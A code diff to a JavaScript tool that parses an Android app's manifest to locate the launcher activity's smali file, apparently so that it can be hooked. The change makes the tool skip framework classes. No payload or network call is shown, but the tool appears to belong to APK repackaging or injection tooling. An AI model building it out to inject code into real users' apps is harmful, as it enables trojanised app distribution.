@@ -72,12 +72,14 @@ function GetLauncherActivity(manifest) {
 
     if (activity) {
         let mainActivityClassName = activity['$'] && activity['$']['android:name'];
-        mainActivityClassName = mainActivityClassName.split('.').pop();
-        if (mainActivityClassName.startsWith('.')) {
-            mainActivityClassName = mainActivityClassName.slice(1);
+        if (!mainActivityClassName.startsWith('android.app')) {
+            mainActivityClassName = mainActivityClassName.split('.').pop();
+            if (mainActivityClassName.startsWith('.')) {
+                mainActivityClassName = mainActivityClassName.slice(1);
+            }
+            delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
+            return mainActivityClassName + '.smali';
         }
-        delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
-        return mainActivityClassName + '.smali';
     }
 
     const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
@@ -151,7 +153,6 @@ fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) =>
 
 });
 
-//function to extract the launcher activity from the orginal app
 function GetLauncherActivity(manifest) {
 
     const application = manifest['manifest']['application'][0];
@@ -182,12 +183,14 @@ function GetLauncherActivity(manifest) {
 
     if (activity) {
         let mainActivityClassName = activity['$'] && activity['$']['android:name'];
-        mainActivityClassName = mainActivityClassName.split('.').pop();
-        if (mainActivityClassName.startsWith('.')) {
-            mainActivityClassName = mainActivityClassName.slice(1);
+        if (!mainActivityClassName.startsWith('android.app')) {
+            mainActivityClassName = mainActivityClassName.split('.').pop();
+            if (mainActivityClassName.startsWith('.')) {
+                mainActivityClassName = mainActivityClassName.slice(1);
+            }
+            delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
+            return mainActivityClassName + '.smali';
         }
-        delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
-        return mainActivityClassName + '.smali';
     }
 
     const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {
